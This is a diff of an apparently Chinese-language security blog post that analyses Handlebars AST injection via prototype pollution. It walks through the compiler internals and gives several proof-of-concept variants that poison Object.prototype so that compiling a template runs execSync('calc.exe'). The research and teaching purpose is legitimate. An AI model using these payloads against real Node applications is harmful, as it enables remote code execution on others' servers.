class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
 
-    if (this.lookupPropertyFunctionIsUsed) &#123;
-      varDeclarations += &#39;, &#39; + this.lookupPropertyFunctionVarDeclaration();
-    &#125;
 
-    var params = [&#39;container&#39;, &#39;depth0&#39;, &#39;helpers&#39;, &#39;partials&#39;, &#39;data&#39;];
 
-    if (this.useBlockParams || this.useDepths) &#123;
-      params.push(&#39;blockParams&#39;);
-    &#125;
-    if (this.useDepths) &#123;
-      params.push(&#39;depths&#39;);
-    &#125;
-
-    // Perform a second pass over the output to merge content when possible
-    var source = this.mergeSource(varDeclarations); // 把原本的source和varDeclarations拼接起来
-
-    if (asObject) &#123;
-      params.push(source);
-
-      return Function.apply(this, params);
-    &#125; else &#123;
-      return this.source.wrap([&#39;function(&#39;, params.join(&#39;,&#39;), &#39;) &#123;\n  &#39;, source, &#39;&#125;&#39;]); // 将source封装成函数
-    &#125;
-  &#125;,</code></pre>
-<h4 id="生成模板"><a href="#生成模板" class="headerlink" title="生成模板"></a>生成模板</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
-
-  function compileInput() &#123;
-    var ast = env.parse(input, options), 
-        environment = new env.Compiler().compile(ast, options),
-        templateSpec = new env.JavaScriptCompiler().compile(environment, options, undefined, true); 
-    return env.template(templateSpec); // 生成模板
-  &#125;</code></pre>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars.runtime.js
-
-function create() &#123;
-  var hb = new base.HandlebarsEnvironment();
-
-  Utils.extend(hb, base);
-  hb.SafeString = _handlebarsSafeString2[&#39;default&#39;];
-  hb.Exception = _handlebarsException2[&#39;default&#39;];
-  hb.Utils = Utils;
-  hb.escapeExpression = Utils.escapeExpression;
-
-  hb.VM = runtime;
-  hb.template = function (spec) &#123;
-    return runtime.template(spec, hb);
-  &#125;;
-
-  return hb;
-&#125;</code></pre>
-<h4 id="模板函数执行"><a href="#模板函数执行" class="headerlink" title="模板函数执行"></a>模板函数执行</h4><pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js
-
-  function ret(context, execOptions) &#123;
-    if (!compiled) &#123;
-      compiled = compileInput();
-    &#125;
-    return compiled.call(this, context, execOptions); // 执行函数获取返回值
-  &#125;</code></pre>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\runtime.js
-
-  function ret(context) &#123;
-    var options = arguments.length &lt;= 1 || arguments[1] === undefined ? &#123;&#125; : arguments[1];
-
-    var data = options.data;
-
-    ret._setup(options);
-    if (!options.partial &amp;&amp; templateSpec.useData) &#123;
-      data = initData(context, data);
-    &#125;
-    var depths = undefined,
-        blockParams = templateSpec.useBlockParams ? [] : undefined;
-    if (templateSpec.useDepths) &#123;
-      if (options.depths) &#123;
-        depths = context != options.depths[0] ? [context].concat(options.depths) : options.depths;
-      &#125; else &#123;
-        depths = [context];
-      &#125;
-    &#125;
-
-    function main(context /*, options*/) &#123;
-      return &#39;&#39; + templateSpec.main(container, context, container.helpers, container.partials, data, blockParams, depths); 
-    &#125;
-
-    main = executeDecorators(templateSpec.main, main, container, options.depths || [], data, blockParams); // 对main函数进行装饰
-    return main(context, options); // 执行main函数
-  &#125;
-</code></pre>
-<h4 id="被污染的函数"><a href="#被污染的函数" class="headerlink" title="被污染的函数"></a>被污染的函数</h4><pre><code class="js">(function anonymous(container,depth0,helpers,partials,data
-) &#123;
-  var stack1, lookupProperty = container.lookupProperty || function(parent, propertyName) &#123;
-        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) &#123;
-          return parent[propertyName];
-        &#125;
-        return undefined
-    &#125;;
-
-  return ((stack1 = (lookupProperty(helpers,&quot;undefined&quot;)||(depth0 &amp;&amp; lookupProperty(depth0,&quot;undefined&quot;))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || &#123;&#125;),console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString()),&#123;&quot;name&quot;:&quot;undefined&quot;,&quot;hash&quot;:&#123;&#125;,&quot;data&quot;:data,&quot;loc&quot;:&#123;&quot;start&quot;:0,&quot;end&quot;:0&#125;&#125;)) != null ? stack1 : &quot;&quot;);
-
-&#125;)</code></pre>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
 <li><p>漏洞核心在于污染编译过程中的<code>pushLiteral</code>操作，其中可以用到<code>NumberLiteral</code>类型和<code>BooleanLiteral</code>类型</p>
 </li>
 <li><p>令<code>type</code>为<code>Program</code>绕过<code>Lexer</code>解析器，从<code>compiler.js</code>找到可用的<code>Gadget</code></p>
 </li>
 <li><p>在寻找<code>Gadget</code>时注意保持语法树的栈平衡，不然会在编译的时候抛出如下错误，这也是为什么我们需要借助<code>MustacheStatement</code>类型注入我们的payload，而不能直接将<code>NumberLiteral</code>注入到<code>body</code>中</p>
-<pre><code class="js">    /* istanbul ignore next */
-    if (this.stackSlot || this.inlineStack.length || this.compileStack.length) &#123;
-      throw new _exception2[&#39;default&#39;](&#39;Compile completed with content left on stack&#39;);
-    &#125;</code></pre>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* istanbul ignore next */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">stackSlot</span> || <span class="variable language_">this</span>.<span class="property">inlineStack</span>.<span class="property">length</span> || <span class="variable language_">this</span>.<span class="property">compileStack</span>.<span class="property">length</span>) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Compile completed with content left on stack&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 </li>
 </ol>
 <h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="BooleanLiteral"><a href="#BooleanLiteral" class="headerlink" title="BooleanLiteral"></a>BooleanLiteral</h4><p>将<code>NumberLiteral</code>替换为<code>BooleanLiteral</code></p>
-<pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;BooleanLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123; <span class="string">&quot;start&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;MustacheStatement&quot;,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;BooleanLiteral&quot;,
-        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-    &#125;],
-    &quot;path&quot;: 0,
-    &quot;loc&quot;: &#123; &quot;start&quot;: 0 &#125;
-&#125;];
-
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
 <h4 id="PartialStatement"><a href="#PartialStatement" class="headerlink" title="PartialStatement"></a>PartialStatement</h4><p>将<code>MustacheStatement</code>改为<code>PartialStatement</code></p>
-<pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PartialStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;PartialStatement&quot;,
-    &quot;name&quot;: &quot;&quot;,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;NumberLiteral&quot;,
-        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-    &#125;]
-&#125;];
-
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
 <h4 id="PartialBlockStatement"><a href="#PartialBlockStatement" class="headerlink" title="PartialBlockStatement"></a>PartialBlockStatement</h4><p>将<code>MustacheStatement</code>改为<code>PartialBlockStatement</code></p>
-<pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PartialBlockStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;openStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;closeStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;program&quot;</span>: &#123; <span class="string">&quot;body&quot;</span>: <span class="number">0</span> &#125;,</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;PartialBlockStatement&quot;,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;NumberLiteral&quot;,
-        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-    &#125;],
-    &quot;name&quot;: 0,
-    &quot;openStrip&quot;: 0,
-    &quot;closeStrip&quot;: 0,
-    &quot;program&quot;: &#123; &quot;body&quot;: 0 &#125;,
-&#125;];
-
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
 <h4 id="BlockStatement"><a href="#BlockStatement" class="headerlink" title="BlockStatement"></a>BlockStatement</h4><p>将<code>MustacheStatement</code>改为<code>BlockStatement</code></p>
-<pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;BlockStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;openStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;closeStrip&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;program&quot;</span>: &#123; <span class="string">&quot;body&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;BlockStatement&quot;,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;NumberLiteral&quot;,
-        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-    &#125;],
-    &quot;path&quot;: 0,
-    &quot;loc&quot;: 0,
-    &quot;openStrip&quot;: 0,
-    &quot;closeStrip&quot;: 0,
-    &quot;program&quot;: &#123; &quot;body&quot;: 0 &#125;
-&#125;];
-
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
 <h4 id="Decorator"><a href="#Decorator" class="headerlink" title="Decorator"></a>Decorator</h4><p>触发点和上面的有所差异，这个是在装饰<code>main</code>函数的时候插入自定义代码</p>
-<pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Decorator&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">	<span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123; <span class="string">&quot;start&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;Decorator&quot;,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;NumberLiteral&quot;,
-        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-    &#125;],
-    &quot;path&quot;: 0,
-    &quot;loc&quot;: &#123; &quot;start&quot;: 0 &#125;
-&#125;];
-
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
 <h4 id="inf-Hash"><a href="#inf-Hash" class="headerlink" title="inf Hash"></a>inf Hash</h4><p>无限内嵌<code>Hash</code>类型</p>
-<pre><code class="js">const Handlebars = require(&#39;handlebars&#39;);
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Hash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pairs&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Hash&quot;</span>,</span><br><span class="line">                <span class="string">&quot;pairs&quot;</span>: [&#123;</span><br><span class="line">                    <span class="string">&quot;value&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc.exe&#x27;).toString())&quot;</span></span><br><span class="line">                &#125;&#125;]</span><br><span class="line">        &#125;&#125;]</span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123; <span class="string">&quot;start&quot;</span>: <span class="number">0</span> &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br></pre></td></tr></table></figure>
 
-Object.prototype.type = &#39;Program&#39;;
-Object.prototype.body = [&#123;
-    &quot;type&quot;: &quot;MustacheStatement&quot;,
-    &quot;params&quot;: [&#123;
-        &quot;type&quot;: &quot;Hash&quot;,
-        &quot;pairs&quot;: [&#123;
-            &quot;value&quot;:&#123;
-                &quot;type&quot;: &quot;Hash&quot;,
-                &quot;pairs&quot;: [&#123;
-                    &quot;value&quot;:&#123;
-                        &quot;type&quot;: &quot;NumberLiteral&quot;,
-                        &quot;value&quot;: &quot;console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc.exe&#39;).toString())&quot;
-                &#125;&#125;]
-        &#125;&#125;]
-    &#125;],
-    &quot;path&quot;: 0,
-    &quot;loc&quot;: &#123; &quot;start&quot;: 0 &#125;
-&#125;];
 
-var source = &quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;;
-var template = Handlebars.compile(source);
-console.log(template(&#123;&#125;));</code></pre>
+
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/">https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Tomcat内存马</div></div></a></div><div class="next-post pull-right"><a href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Dubbo反序列化漏洞研究</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">原理图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">2.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">3.1.</span> <span class="toc-text">调用栈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E5%85%A5%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">解析入口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90AST"><span class="toc-number">3.3.</span> <span class="toc-text">解析AST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">3.4.</span> <span class="toc-text">编译环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.5.</span> <span class="toc-text">编译模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.6.</span> <span class="toc-text">生成模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">3.7.</span> <span class="toc-text">模板函数执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%B1%A1%E6%9F%93%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.8.</span> <span class="toc-text">被污染的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">5.</span> <span class="toc-text">拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BooleanLiteral"><span class="toc-number">5.1.</span> <span class="toc-text">BooleanLiteral</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PartialStatement"><span class="toc-number">5.2.</span> <span class="toc-text">PartialStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PartialBlockStatement"><span class="toc-number">5.3.</span> <span class="toc-text">PartialBlockStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BlockStatement"><span class="toc-number">5.4.</span> <span class="toc-text">BlockStatement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Decorator"><span class="toc-number">5.5.</span> <span class="toc-text">Decorator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#inf-Hash"><span class="toc-number">5.6.</span> <span class="toc-text">inf Hash</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" 